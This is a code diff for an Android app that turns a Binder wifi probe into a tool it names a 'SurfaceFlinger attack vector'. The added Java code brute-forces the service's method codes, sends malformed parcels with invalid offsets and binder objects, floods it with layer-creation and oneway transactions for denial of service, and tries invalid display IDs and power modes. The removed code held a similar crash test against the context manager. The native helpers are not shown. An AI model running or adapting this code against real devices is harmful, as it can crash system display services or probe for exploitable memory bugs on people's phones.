@@ -58,7 +58,8 @@ public class MainActivity extends AppCompatActivity {
     public static native byte[] nativeBinderGetService(int fd, String serviceName, String descriptor);
     public static native String nativeBinderDumpReply(int fd, int handle, int code, int flags, byte[] data);
     public static native int nativeBinderWriteToService(int fd, int handle, int code, int flags, byte[] data);
-    public static native byte[] nativeBuildGetServiceParcel(String descriptor);
+    public static native byte[] nativeBuildSurfaceFlingerParcel(int displayId, int layerId, int what, int x, int y, int w, int h);
+    public static native byte[] nativeBuildMalformedParcel(int size, int offsetCount);
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
@@ -168,7 +169,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeExploit() {
         appendLog("========================================");
-        appendLog("========== BINDER WIFI EXPLORATION ==========");
+        appendLog("========== SURFACEFLINGER ATTACK VECTOR ==========");
 
         int fd = nativeOpenDevice("/dev/binder");
         if (fd < 0) {
@@ -180,33 +181,41 @@ public class MainActivity extends AppCompatActivity {
         }
         appendLog("[+] Using fd=" + fd);
 
-        appendLog("[*] Getting wifi service handle with correct descriptor format");
-        byte[] svcReply = nativeBinderGetService(fd, "wifi", "android.net.wifi.IWifiManager");
-        int wifiHandle = -1;
-        if (svcReply != null && svcReply.length >= 4) {
-            wifiHandle = ((svcReply[0] & 0xFF) |
-                          ((svcReply[1] & 0xFF) << 8) |
-                          ((svcReply[2] & 0xFF) << 16) |
-                          ((svcReply[3] & 0xFF) << 24));
-            appendLog("[GETSVC] wifi -> handle=" + wifiHandle + " (0x" + Integer.toHexString(wifiHandle) + ")");
-            dumpToFile(svcReply, "getsvc_wifi.bin");
-        } else {
-            appendLog("[GETSVC] wifi -> no reply");
-        }
-
-        if (wifiHandle > 0) {
-            appendLog("[*] WiFi handle obtained, testing methods");
-            testWifiMethods(fd, wifiHandle);
-        } else {
-            appendLog("[!] WiFi handle not found, trying fallback handles 1-5");
-            for (int h = 1; h <= 5; h++) {
-                appendLog("[*] Testing handle " + h + " as potential wifi service");
-                testWifiMethods(fd, h);
+        appendLog("[*] Getting SurfaceFlinger handle...");
+        String[] names = {"SurfaceFlinger", "android.ui.ISurfaceComposer", "android.gui.ISurfaceComposer"};
+        int sfHandle = -1;
+        for (String name : names) {
+            byte[] reply = nativeBinderGetService(fd, name, "android.ui.ISurfaceComposer");
+            if (reply != null && reply.length >= 4) {
+                int h = ((reply[0] & 0xFF) | ((reply[1] & 0xFF) << 8) |
+                         ((reply[2] & 0xFF) << 16) | ((reply[3] & 0xFF) << 24));
+                if (h != 0) {
+                    sfHandle = h;
+                    appendLog("[GETSVC] " + name + " -> handle=" + h);
+                    dumpToFile(reply, "getsvc_sf_" + name + ".bin");
+                    break;
+                }
             }
         }
+        if (sfHandle < 0) {
+            appendLog("[!] SurfaceFlinger handle not found, assuming handle=0 (context manager)");
+            sfHandle = 0;
+        }
 
-        appendLog("[*] Testing context manager with malformed GET_SERVICE");
-        testContextManagerCrash(fd);
+        appendLog("[*] Testing SurfaceFlinger with handle=" + sfHandle);
+        testSurfaceFlingerMethods(fd, sfHandle);
+
+        appendLog("[*] Testing malformed parcels on SurfaceFlinger");
+        testMalformedParcels(fd, sfHandle);
+
+        appendLog("[*] Testing resource exhaustion (layer creation spam)");
+        testResourceExhaustion(fd, sfHandle);
+
+        appendLog("[*] Testing invalid display/layer IDs");
+        testInvalidIds(fd, sfHandle);
+
+        appendLog("[*] Testing large transaction spam (DoS)");
+        testTransactionSpam(fd, sfHandle);
 
         try {
             ParcelFileDescriptor.adoptFd(fd).close();
@@ -221,82 +230,137 @@ public class MainActivity extends AppCompatActivity {
         finishTest();
     }
 
-    private void testWifiMethods(int fd, int handle) {
-        appendLog("[WIFI] Testing handle " + handle);
+    private void testSurfaceFlingerMethods(int fd, int handle) {
+        appendLog("[SF] Brute-forcing method codes 0-60");
 
-        int[] wifiCodes = {
-            1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
-            11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
-            21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
-            31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
-            41, 42, 43, 44, 45, 46, 47, 48, 49, 50
-        };
+        int[] codes = new int[61];
+        for (int i = 0; i <= 60; i++) codes[i] = i;
 
-        for (int code : wifiCodes) {
+        for (int code : codes) {
             if (stopRequested.get()) break;
-            byte[] data = null;
-            if (code == 1 || code == 2 || code == 3 || code == 4 || code == 5) {
-                data = new byte[4];
-                data[0] = 1;
+            String result = nativeBinderDumpReply(fd, handle, code, 0, null);
+            if (result.contains("len=")) {
+                appendLog("[SF] code=0x" + Integer.toHexString(code) + " -> " + result);
+                try { Thread.sleep(5); } catch (Exception e) {}
             }
-            String result = nativeBinderDumpReply(fd, handle, code, 0, data);
-            appendLog("[WIFI] code=0x" + Integer.toHexString(code) + " -> " + result);
-            try { Thread.sleep(10); } catch (Exception e) {}
         }
 
-        byte[] largeData = new byte[4096];
-        for (int i = 0; i < largeData.length; i++) largeData[i] = (byte)(i & 0xFF);
-        for (int code : new int[]{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}) {
+        appendLog("[SF] Trying codes 0x64-0x7F (100-127)");
+        for (int code = 0x64; code <= 0x7F; code++) {
             if (stopRequested.get()) break;
-            String result = nativeBinderDumpReply(fd, handle, code, 1, largeData);
-            appendLog("[WIFI-ONEWAY] code=0x" + Integer.toHexString(code) + " -> " + result);
-            try { Thread.sleep(10); } catch (Exception e) {}
-        }
-
-        for (int size : new int[]{16, 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384}) {
-            byte[] d = new byte[size];
-            for (int i = 0; i < d.length; i++) d[i] = (byte)((i * 7) & 0xFF);
-            String result = nativeBinderDumpReply(fd, handle, 1, 0, d);
-            appendLog("[WIFI-SIZE] " + size + " bytes -> " + result);
-            try { Thread.sleep(10); } catch (Exception e) {}
+            String result = nativeBinderDumpReply(fd, handle, code, 0, null);
+            if (result.contains("len=")) {
+                appendLog("[SF] code=0x" + Integer.toHexString(code) + " -> " + result);
+                try { Thread.sleep(5); } catch (Exception e) {}
+            }
         }
     }
 
-    private void testContextManagerCrash(int fd) {
-        appendLog("[CRASH-CTX] Sending malformed GET_SERVICE to context manager");
+    private void testMalformedParcels(int fd, int handle) {
+        appendLog("[SF-MALFORM] Sending malformed parcels");
 
-        appendLog("[CRASH-CTX] empty data (no parcel)");
-        byte[] reply = nativeBinderTransaction(fd, 0, 1, 0, null);
-        if (reply == null) {
-            appendLog("[CRASH-CTX] no reply");
-        } else {
-            appendLog("[CRASH-CTX] reply len=" + reply.length);
+        int[] sizes = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65536};
+        for (int size : sizes) {
+            if (stopRequested.get()) break;
+            byte[] data = new byte[size];
+            for (int i = 0; i < data.length; i++) data[i] = (byte)(i & 0xFF);
+            String result = nativeBinderDumpReply(fd, handle, 4, 0, data);
+            appendLog("[SF-MALFORM] size=" + size + " -> " + result);
+            try { Thread.sleep(5); } catch (Exception e) {}
         }
 
-        byte[] lenOnly = new byte[4];
-        lenOnly[0] = 100;
-        appendLog("[CRASH-CTX] length=100 with no data");
-        reply = nativeBinderTransaction(fd, 0, 1, 0, lenOnly);
-        if (reply == null) {
-            appendLog("[CRASH-CTX] no reply");
-        } else {
-            appendLog("[CRASH-CTX] reply len=" + reply.length);
+        appendLog("[SF-MALFORM] Sending parcels with offsets (invalid)");
+        for (int offsetCount = 1; offsetCount <= 16; offsetCount++) {
+            if (stopRequested.get()) break;
+            byte[] data = nativeBuildMalformedParcel(128, offsetCount);
+            String result = nativeBinderDumpReply(fd, handle, 4, 0, data);
+            appendLog("[SF-MALFORM] offsetCount=" + offsetCount + " -> " + result);
+            try { Thread.sleep(10); } catch (Exception e) {}
         }
 
-        byte[] wrongLen = new byte[4 + 5];
-        wrongLen[0] = 100;
-        wrongLen[1] = 0;
-        wrongLen[2] = 0;
-        wrongLen[3] = 0;
-        String svc = "wifi";
-        System.arraycopy(svc.getBytes(StandardCharsets.UTF_8), 0, wrongLen, 4, svc.length());
-        wrongLen[4 + svc.length()] = 0;
-        appendLog("[CRASH-CTX] length=100 but actual data shorter");
-        reply = nativeBinderTransaction(fd, 0, 1, 0, wrongLen);
-        if (reply == null) {
-            appendLog("[CRASH-CTX] no reply");
-        } else {
-            appendLog("[CRASH-CTX] reply len=" + reply.length);
+        appendLog("[SF-MALFORM] Sending parcels with invalid binder objects");
+        byte[] objParcel = nativeBuildSurfaceFlingerParcel(0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0, 0, 0, 0);
+        String result = nativeBinderDumpReply(fd, handle, 4, 0, objParcel);
+        appendLog("[SF-MALFORM] invalid display/layer -> " + result);
+
+        byte[] hugeObjParcel = nativeBuildSurfaceFlingerParcel(0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0, 0, 1920, 1080);
+        result = nativeBinderDumpReply(fd, handle, 6, 0, hugeObjParcel);
+        appendLog("[SF-MALFORM] createLayer with invalid params -> " + result);
+    }
+
+    private void testResourceExhaustion(int fd, int handle) {
+        appendLog("[SF-DOS] Resource exhaustion: creating many layers");
+
+        for (int i = 0; i < 100; i++) {
+            if (stopRequested.get()) break;
+            byte[] data = nativeBuildSurfaceFlingerParcel(1, i + 1, 0, 0, 0, 100, 100);
+            String result = nativeBinderDumpReply(fd, handle, 6, 1, data);
+            if (i % 10 == 0) {
+                appendLog("[SF-DOS] Layer " + i + " -> " + result);
+            }
+            try { Thread.sleep(2); } catch (Exception e) {}
+        }
+
+        appendLog("[SF-DOS] Trying to destroy non-existent layers");
+        for (int i = 0; i < 50; i++) {
+            if (stopRequested.get()) break;
+            byte[] data = nativeBuildSurfaceFlingerParcel(1, i + 1000, 0, 0, 0, 0, 0);
+            String result = nativeBinderDumpReply(fd, handle, 7, 0, data);
+            if (i % 10 == 0) {
+                appendLog("[SF-DOS] Destroy layer " + (i + 1000) + " -> " + result);
+            }
+            try { Thread.sleep(2); } catch (Exception e) {}
+        }
+    }
+
+    private void testInvalidIds(int fd, int handle) {
+        appendLog("[SF-INVALID] Testing with invalid display IDs");
+
+        int[] displayIds = {0, 1, 2, 3, 4, 5, 0xFFFFFFFF, 0x7FFFFFFF, 0x80000000};
+        for (int id : displayIds) {
+            if (stopRequested.get()) break;
+            byte[] data = nativeBuildSurfaceFlingerParcel(id, 0, 0, 0, 0, 0, 0);
+            String result = nativeBinderDumpReply(fd, handle, 1, 0, data);
+            appendLog("[SF-INVALID] createDisplay id=0x" + Integer.toHexString(id) + " -> " + result);
+            try { Thread.sleep(5); } catch (Exception e) {}
+        }
+
+        appendLog("[SF-INVALID] Testing setPowerMode with invalid modes");
+        int[] modes = {0, 1, 2, 3, 4, 5, 0xFFFFFFFF, 0x7FFFFFFF};
+        for (int mode : modes) {
+            if (stopRequested.get()) break;
+            byte[] data = new byte[8];
+            data[0] = (byte)(mode & 0xFF);
+            data[1] = (byte)((mode >> 8) & 0xFF);
+            data[2] = (byte)((mode >> 16) & 0xFF);
+            data[3] = (byte)((mode >> 24) & 0xFF);
+            String result = nativeBinderDumpReply(fd, handle, 9, 0, data);
+            appendLog("[SF-INVALID] setPowerMode mode=" + mode + " -> " + result);
+            try { Thread.sleep(5); } catch (Exception e) {}
+        }
+    }
+
+    private void testTransactionSpam(int fd, int handle) {
+        appendLog("[SF-SPAM] Sending many transactions rapidly");
+
+        for (int i = 0; i < 200; i++) {
+            if (stopRequested.get()) break;
+            byte[] data = nativeBuildSurfaceFlingerParcel(1, i % 10, i % 10, i % 100, i % 100, 100, 100);
+            nativeBinderWriteToService(fd, handle, 4, 1, data);
+            if (i % 20 == 0) {
+                appendLog("[SF-SPAM] Sent " + (i + 1) + " transactions");
+            }
+            try { Thread.sleep(1); } catch (Exception e) {}
+        }
+
+        appendLog("[SF-SPAM] Sending empty transactions with oneway flag");
+        for (int i = 0; i < 100; i++) {
+            if (stopRequested.get()) break;
+            nativeBinderWriteToService(fd, handle, 0, 1, null);
+            if (i % 20 == 0) {
+                appendLog("[SF-SPAM] Sent " + (i + 1) + " empty oneway");
+            }
+            try { Thread.sleep(1); } catch (Exception e) {}
         }
     }
 
@@ -338,9 +402,9 @@ public class MainActivity extends AppCompatActivity {
     private void saveLog() {
         try {
             File dir = getDumpDir();
-            File file = new File(dir, "binder_wifi_test_log.txt");
+            File file = new File(dir, "surfaceflinger_attack_log.txt");
             try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
-                pw.println("=== Binder Wifi Test Log ===");
+                pw.println("=== SurfaceFlinger Attack Log ===");
                 pw.println("Timestamp: " + new Date().toString());
                 pw.println("===================================");
                 pw.print(logBuilder.toString());
